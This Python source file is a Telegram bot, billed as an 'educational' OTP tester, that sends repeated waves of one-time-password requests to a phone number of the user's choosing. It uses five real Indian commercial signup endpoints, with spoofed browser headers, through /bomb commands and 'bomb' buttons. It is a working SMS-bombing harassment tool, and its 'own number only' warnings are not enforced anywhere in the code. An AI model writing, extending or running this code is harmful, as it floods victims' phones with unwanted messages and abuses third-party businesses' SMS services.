import asyncio
import aiohttp
import time
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# ===== CONFIGURATION FROM ENV =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_USER_IDS = os.getenv("ADMIN_USER_IDS", "").split(",")
PORT = int(os.getenv("PORT", 8443))
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")

# Simplified API configs (5 APIs for educational purposes)
API_CONFIGS = [
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "Stratzy",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "country_code": "IN",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    {
        "name": "Beepkart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "appname": "Website",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}","source":"myaccount"}}'
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    }
]

# Store active bombing sessions
active_sessions = {}

# ===== HELPER FUNCTIONS =====
async def make_api_call(session, config, phone):
    """Make a single API call"""
    try:
        url = config["url"]
        headers = config["headers"].copy()
        data = config["data"](phone) if config["data"] else None
        
        async with session.post(url, headers=headers, data=data, timeout=5) as response:
            return {
                "name": config["name"],
                "status": response.status,
                "success": 200 <= response.status < 300
            }
    except Exception as e:
        return {
            "name": config["name"],
            "status": "Error",
            "success": False,
            "error": str(e)
        }

async def send_otp_wave(phone, callback=None):
    """Send one wave of OTP requests"""
    async with aiohttp.ClientSession() as session:
        tasks = [make_api_call(session, config, phone) for config in API_CONFIGS]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(1 for r in results if r["success"])
        
        if callback:
            await callback(results, success_count)
        
        return results

# ===== BOT COMMAND HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    welcome_msg = (
        "🤖 *OTP Tester Bot - Educational Purpose*\n\n"
        "⚠️ *WARNING:* This bot is for educational testing only!\n"
        "✅ Only use on YOUR OWN phone number\n"
        "❌ Misuse is illegal and unethical\n\n"
        "*Commands:*\n"
        "/start - Show this message\n"
        "/test <number> - Test OTP on a number\n"
        "/bomb <number> <count> - Send multiple OTPs\n"
        "/stop - Stop active session\n"
        "/status - Check active sessions\n"
        "/help - Show help\n\n"
        "Send a 10-digit phone number to begin."
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_msg = (
        "*How to use:*\n\n"
        "1️⃣ Send a 10-digit phone number (without +91)\n"
        "2️⃣ Choose single test or multiple waves\n"
        "3️⃣ Monitor the results\n\n"
        "*Examples:*\n"
        "`/test 9876543210` - Single OTP test\n"
        "`/bomb 9876543210 5` - Send 5 waves\n\n"
        "*Note:* Use responsibly and only on your own number!"
    )
    await update.message.reply_text(help_msg, parse_mode="Markdown")

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test single OTP wave"""
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /test <phone_number>")
        return
    
    phone = context.args[0].strip()
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    msg = await update.message.reply_text(f"🔄 Testing OTP services for {phone}...")
    
    async def callback(results, success_count):
        result_text = f"📊 *Test Results for {phone}*\n\n"
        result_text += f"✅ Success: {success_count}/{len(results)}\n\n"
        
        for r in results:
            emoji = "✅" if r["success"] else "❌"
            result_text += f"{emoji} {r['name']}: {r['status']}\n"
        
        await msg.edit_text(result_text, parse_mode="Markdown")
    
    await send_otp_wave(phone, callback)

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send multiple OTP waves"""
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /bomb <phone_number> <count>")
        return
    
    phone = context.args[0].strip()
    
    try:
        count = int(context.args[1])
        if count < 1 or count > 10:
            await update.message.reply_text("❌ Count must be between 1 and 10")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid count! Must be a number.")
        return
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    user_id = update.effective_user.id
    
    # Store session
    active_sessions[user_id] = {"phone": phone, "active": True}
    
    msg = await update.message.reply_text(
        f"🚀 Starting {count} waves for {phone}...\n"
        f"Use /stop to cancel anytime."
    )
    
    total_success = 0
    
    for i in range(count):
        if not active_sessions.get(user_id, {}).get("active", False):
            await msg.edit_text(f"⏹️ Stopped at wave {i}/{count}")
            break
        
        async def callback(results, success_count):
            nonlocal total_success
            total_success += success_count
            await msg.edit_text(
                f"📡 Wave {i+1}/{count} completed\n"
                f"✅ Total Success: {total_success}\n"
                f"⏳ Progress: {'▓' * (i+1)}{'░' * (count-i-1)}"
            )
        
        await send_otp_wave(phone, callback)
        
        if i < count - 1:
            await asyncio.sleep(2)  # 2 second delay between waves
    
    if user_id in active_sessions:
        del active_sessions[user_id]
    
    await msg.edit_text(
        f"✅ Completed {count} waves for {phone}\n"
        f"📊 Total Success: {total_success}/{count * len(API_CONFIGS)}"
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop active bombing session"""
    user_id = update.effective_user.id
    
    if user_id in active_sessions:
        active_sessions[user_id]["active"] = False
        await update.message.reply_text("⏹️ Stopping your active session...")
    else:
        await update.message.reply_text("❌ No active session found.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check status"""
    user_id = update.effective_user.id
    
    if user_id in active_sessions and active_sessions[user_id]["active"]:
        phone = active_sessions[user_id]["phone"]
        await update.message.reply_text(f"🔄 Active session for: {phone}")
    else:
        await update.message.reply_text("✅ No active sessions")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle plain text messages (phone numbers)"""
    text = update.message.text.strip()
    
    if text.isdigit() and len(text) == 10:
        keyboard = [
            [InlineKeyboardButton("🧪 Single Test", callback_data=f"test_{text}")],
            [InlineKeyboardButton("💣 3 Waves", callback_data=f"bomb_{text}_3")],
            [InlineKeyboardButton("🔥 5 Waves", callback_data=f"bomb_{text}_5")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"📱 Phone Number: *{text}*\n\n"
            f"⚠️ Use only on YOUR number!\n"
            f"Choose an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "❌ Invalid input!\n"
            "Send a 10-digit phone number or use /help"
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "cancel":
        await query.edit_message_text("❌ Cancelled")
        return
    
    parts = data.split("_")
    action = parts[0]
    phone = parts[1]
    
    if action == "test":
        await query.edit_message_text(f"🔄 Testing {phone}...")
        
        async def callback(results, success_count):
            result_text = f"📊 *Test Results*\n\n"
            result_text += f"✅ Success: {success_count}/{len(results)}\n\n"
            
            for r in results:
                emoji = "✅" if r["success"] else "❌"
                result_text += f"{emoji} {r['name']}: {r['status']}\n"
            
            await query.edit_message_text(result_text, parse_mode="Markdown")
        
        await send_otp_wave(phone, callback)
    
    elif action == "bomb":
        count = int(parts[2])
        user_id = update.effective_user.id
        active_sessions[user_id] = {"phone": phone, "active": True}
        
        await query.edit_message_text(f"🚀 Starting {count} waves...")
        
        total_success = 0
        
        for i in range(count):
            if not active_sessions.get(user_id, {}).get("active", False):
                await query.edit_message_text(f"⏹️ Stopped at wave {i}/{count}")
                break
            
            async def cb(results, success_count):
                nonlocal total_success
                total_success += success_count
                await query.edit_message_text(
                    f"📡 Wave {i+1}/{count}\n"
                    f"✅ Success: {total_success}\n"
                    f"{'▓' * (i+1)}{'░' * (count-i-1)}"
                )
            
            await send_otp_wave(phone, cb)
            
            if i < count - 1:
                await asyncio.sleep(2)
        
        if user_id in active_sessions:
            del active_sessions[user_id]
        
        await query.edit_message_text(f"✅ Completed {count} waves!\n📊 Success: {total_success}")

# ===== ERROR HANDLER =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    print(f"Update {update} caused error {context.error}")

# ===== MAIN =====
def main():
    """Start the bot"""
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not found in environment variables!")
        print("Please set BOT_TOKEN in your .env file or Railway environment variables")
        return
    
    print("🤖 Starting OTP Tester Bot...")
    print(f"🌐 Port: {PORT}")
    print(f"🔗 Webhook: {WEBHOOK_URL if WEBHOOK_URL else 'Polling mode'}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("test", test_command))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    # Use webhook for Railway, polling for local
    if WEBHOOK_URL:
        print("✅ Running in webhook mode (Railway)")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}",
            url_path=BOT_TOKEN
        )
    else:
        print("✅ Running in polling mode (Local)")
        app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()